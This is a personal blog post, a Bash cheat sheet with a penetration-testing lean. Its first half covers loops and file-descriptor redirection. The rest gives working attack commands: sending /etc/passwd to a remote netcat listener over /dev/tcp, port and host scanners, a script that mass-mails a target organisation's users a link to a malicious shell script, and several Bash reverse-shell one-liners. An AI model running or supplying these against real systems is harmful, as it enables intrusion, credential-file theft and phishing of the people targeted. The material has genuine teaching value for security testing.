---
layout: post
title: My Advanced Bash Cheat Sheet
date: 2021-02-17 16:19 -0400
categories: [Cheat Sheet]
tags: [bash, cheat sheet]
---

Here are some of the more "advanced" concepts of using Bash. This has more of a pentesting lean, since that's kind of what I do. Still though, I'm sure a lot of people could take something out of this as well. But before I get into the really fun stuff, I need to outline some of the basics.

## Basic Bash Scripting Tricks

You can set the output of a command to a variable by enclosing your command in `$(dollar-parenthesis)`. So to assign a list of users on the system to a variable:
```bash
USERS=$(awk -F: '{print $1}' /etc/passwd)
```

### You can loop over each user with a 'for' loop:

```bash
for user in $USERS;
do
    # do stuff here
    echo "This is a user: $user"
done
```

### Loop over each line of a file
You can loop over the lines of a file in several ways. First, we can use a simple for loop, but this will consider a space to be a delimiter. While this may work for some cases, this would have undesirable output and delimit by spaces:

```bash
for i in $(cat /etc/passwd);
do
    echo "Line from passwd: $i"
done
```

With a while loop using the `read` builtin, specifying `-r` to NOT escape backslash characters, it will properly delimit by newline:

```bash
while read -r line; do
    echo "Line from passwd: $line"
done < /etc/passwd
```

### Loop over a sequential count
```bash
for i in {1..10};
do
    echo "Iteration: $i"
done
```

Or you can use the `seq` binary to do the same, useful in older versions of bash that don't allow the usage of brace expansion:

```bash
for i in $(seq 1 10);
do
    echo "Iteration: $i"
done
```
*I should add a special footnote here, sometimes I refer to things in "old bash." I highly doubt anyone will come across a system where this version of bash does not support something like brace expansion, but in my line of work you will be surprised what you find.*

You can also modify the `seq` statement to count by another number. To get all the even numbers from 0 through 10:

```bash
for i in $(seq 0 2 10);
do
    echo "Iteration: $i"
done
```

### File Descriptor Redirection

Bash has 3 file descriptors that are built in. FD0, which is STDIN, FD1 which is STDOUT, and FD2, which is STDERR. Everything above that is arbitrary. If we open a file and assign it to FD3, the syntax is:

```bash
exec 3<> ./File
```

And we can send things to that file using redirectors. Prepending the number with a `&` is how to properly redirect to a file descriptor, so if I wanted to send the output of a command to the file after assigning it to FD3, I can do something like this:

```bash
cat /etc/passwd >&3
```

Where `>` means to direct output and overwrite, and `&3` means "to FD3". Similarly, `>>&3` means to append to FD3, and `2>&3` means to send FD2 to FD3, or rather STDERR to FD3. Usually you see something like this:

```bash
/usr/bin/some_binary > /dev/null 2>&1
```

Which means to run `/usr/bin/some_binary`, redirect STDERR to STDOUT, and then send that to /dev/null. So basically this sends any output from that binary into the bitbucket.

Finally, to close a file descriptor, use `&-`:

```bash
exec 3>&-
```

This will close FD3.

Now with all that out of the way, we can get to the good stuff.

---

## /dev/{tcp,udp}

One of the greatest things (in my opinion) that Bash has added is the ability to interact with objects via tcp or udp. And the way it is accomplished is by way of interacting with the `/dev/tcp` or `/dev/udp` pseudo-device. To interact with a device on your network directly from bash, you would treat it exactly like a file. Since "everything is a file" on linux, if I wanted to send the text "Hello" to the machine 192.168.1.10 on port 1234, I would issue something like this:

```bash
echo -n "Hello" > /dev/tcp/192.168.1.10/1234
```

By redirecting the output of the echo statement to the `/dev/tcp/192.168.1.10/1234` "file", bash will literally send a TCP packet with the raw text of `Hello`, taking care of the TCP handshake and everything. If the remote end does not have a service listening on the other end to complete the handshake, it will eventually time out after about 20 seconds. UDP however, will not time out and happily send the packet(s) across the wire as is the nature of UDP, the Unreliable Damn Protocol.

### So how can I use this in a practical way?

You can interact with any listening process by sending whatever raw data you'd like to it. You can even send entire files with a little help from netcat! Say you were on a server that didn't have netcat or anything similar but you wanted to pull the contents of the file `/etc/passwd` and send it to your workstation. This would be a two-stage process.

#### Sending a file from remote to local

First, on your local workstation:

```bash
nc -lvnp 9090 > ./rhost-passwd
```
...which sets up a netcat listener on all interfaces listening on port 9090, then takes whatever is sent to it and dumps it into the file named `rhost-passwd`.

Second, on the remote server:

```bash
cat /etc/passwd > /dev/tcp/192.168.1.10/9090
```
...which simply sends the content of the /etc/passwd file to `192.168.1.10` on port `9090` right to our netcat listener.

#### Sending a file from local to remote (without opening a port on remote!)

In the same vein, you can *download* a file simply by connecting to a listener.

```bash
# Send a file to whoever connects:
nc -w 2 -lvnp 9090 < /path/to/some/file
```
Note the use of the `-w 2` flag tells netcat to time out after 2 seconds of inactivity (after receiving a connection). Otherwise this would hang indefinitely.

```bash
# Receive that file
cat > myfile.txt < /dev/tcp/10.20.30.40/9090
```

---

#### Port Scanner without Nmap

In the rare case where you are on a server that you can't just install nmap on (which isn't so rare in information security, now that I think about it), sometimes you are forced to live off the land without making changes to the target operating system and installing binaries. Sometimes all you want to do is run a port scan. Luckily with some fancy bash footwork, this can be scripted fairly easily:

```bash
for port in $(seq 1 65535); do { echo "blah" > /dev/tcp/YOUR_TARGET_IP_HERE/$port && echo "open - $port"; } 2>/dev/null; done
```
This takes a fair bit of time as it is sequential, but it works pretty well. Useful for pivoting, attempting to learn more about a particular machine that your target system only has access to. Also, this is fairly noisy, so any site worth their salt should be able to detect this as this is a fairly obvious and rudimentary scan.

To get even more fancy, you can simply copy-paste this into your interactive bash shell and invoke this as a function:

```bash
nmap2 () {
    [[ $# -ne 1 ]] && echo "Please provide server name" && return 1
    
    for i in {1..9000} ; do
        SERVER="$1"
        PORT=$I
        (echo  > /dev/tcp/$SERVER/$PORT) >& /dev/null &&
  
        echo "Port $PORT seems to be open"
    done
}
```
Then just run it like so: `nmap2 10.20.30.40`. Note however that in the interest of speed I only scanned ports 1 to 9000. Change as needed I guess.

---

#### Host Scanner without Nmap

Similarly, the above can be modified to perform a host scan as well!

```bash
for ip in $(seq 1 255); do ping -c 1 10.20.30.$ip > /dev/null && echo "Online: 10.20.30.$ip"; done
```

I like this one because it's a clever use of the `&&` bash-ism, stating to only execute the `echo` statement if the preceeding statement is successful. However another alternative to the above, but uses the output of ping regardless of the status code of the ping command:

```bash
for i in $(seq 1 255); do ping -c 1 10.20.30.$i | tr \n ' ' | awk '/bytes from/ {print $4}'; done
```
These are still technically not *total* bash-isms since they're using binaries like `ping` and `tr` and `awk`, but they are most likely to be found on any given minimal OS install (except for something like a docker container or similar), so it's still technically living off the land and I'll take it.

---

Now let's turn it up to 11. 

### How to Interact with a Networked Service

Connecting to a remote service is clear enough. We can communicate via TCP or UDP with bash without much of a problem. But is it possible to get a little more thorough? Can we *interact* with a service that requires a back-and-forth? Of course we can, and the way we go about doing that is assigning a file descriptor to the connection and simply interacting with the file descriptor. Since we can't use FD0, FD1 or FD2 as they're assigned to STDIN, STDOUT and STDERR respectively, we can use FD3. And the way we assign it is using the `exec` builtin, and the syntax is `exec 3<>/dev/tcp/etc/etc`. This way we can send raw data via `echo` or `cat` and direct it to FD3 with `>&3`. Probably the best way to explain this is with an interaction with a mail server:

```bash
#!/bin/bash

# Set up the file descriptor, FD3 to point to
# our local mail server listening on port 25
exec 3<>/dev/tcp/127.0.0.1/25

# Now start the interaction. First, say hello!
# Or rather, EHLO for Enhanced hello
echo "EHLO agrohacksstuff.io" >&3

# Now specify the sender address
echo "MAIL FROM: me@example.com" >&3

# The recipient
echo "RCPT TO: dan@localhost" >&3

# Now start the message body
echo "DATA" >&3
echo "This is a test email, blah" >&3
echo "blah blah blah blah blah blah" >&3
echo "blah blah blah blah. Ok bye." >&3

# End the message body with a period surrounded by line breaks
echo "." >&3
```

Or, similarly, you can condense the above using the `-e` flag with echo, which allows the usage of special characters:

```bash
#/bin/bash

exec 3<>/dev/tcp/127.0.0.1/25
echo -e "EHLO agrohacksstuff.io\r\nMAIL FROM: me@example.com\r\nRCPT TO: dan@localhost\r\nDATA\r\nThis is a test email, blah\r\nblah blah blah blah blah blah\r\nblah blah blah blah. Ok bye.\r\n.\r\n" >&3
```

Hopefully you can see the scriptability of this. If I wanted to, say, mail bomb an entire organization if I had a list of potential users in hopes that one of them would read the email, click on a malicious link, I could script up something like this.

Let's say I had a list of users in a file named `users.txt`:

```txt
bob
mary
sue
joe
greg
laura
rich
```

I could use that list with this script:

```bash
#!/bin/bash

exec 3<>/dev/tcp/127.0.0.1/25
while read -r user;
do
    echo "EHLO agrohacksstuff.io" >&3
    sleep 0.2
    echo "MAIL FROM: me@example.com" >&3
    sleep 0.2
    echo "RCPT TO: $user@target.com" >&3
    sleep 0.2
    echo "DATA" >&3
    sleep 0.2
    echo "Please click <a href='http://10.20.30.40/malicious.sh'>here</a>" >&3
    sleep 0.2
    echo "." >&3
done < ./users.txt
```

Sweet! Now is that the best way to do this? Absolutely not. First of all, in my testing this was very spotty as sometimes the MTA I used (in this case, postfix) would trip up over certain lines and throw an error. I think it was because it just send a ton of data in a huge block without waiting on anything, hence all the sleep statements. A better way of doing it is using an actual mail client to send these, but a more fun way of doing it is using pexpect from python! But that's for another article.

## Reverse Shells

These have been done over and over again, so I won't offer much more here. But my favorite reverse shell is using bash:

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/your.ip.here/9090 0>&1'
```

If you can get a remote host to run that, it should connect back to you on port 9090. I can do my best to explain it a bit though.

First of all, bash is invoked twice here. The reason is because if I run just this:

```bash
/bin/bash -i >& /dev/tcp/your.ip.here/9090 0>&1
```

Then this command will only work *if I'm invoking it from within an already-running bash shell.* The reason for that is because the concept of `/dev/tcp` exists only within bash, so if I run the above from within `sh` or `zsh` or something similar, it will have no idea what `/dev/tcp` is referring to, and thus bomb out. It will tell `/bin/bash` to start interactively to somewhere that doesn't exist, and it will fail. Wrapping the above in `/bin/bash -c 'etc etc'` will invoke a new bash shell, and then invoke bash *again* within the first bash shell's `/dev/tcp` object, directive STDOUT and STDIN back and forth through the tunnel.

In the case of the above, `>&` redirects STDOUT and STDERR to the TCP endpoint specified, and `0>&1` redirects STDIN to the same.

Here are some alternatives to the above:

```bash
/bin/bash -i &>/dev/tcp/your.ip.here/9090 <&1
/bin/bash -i &>/dev/tcp/your.ip.here/9090 0<&1
```

All perform the same function. Just know that if it doesn't work at first, try enclosing it within `bash -c 'etc etc'`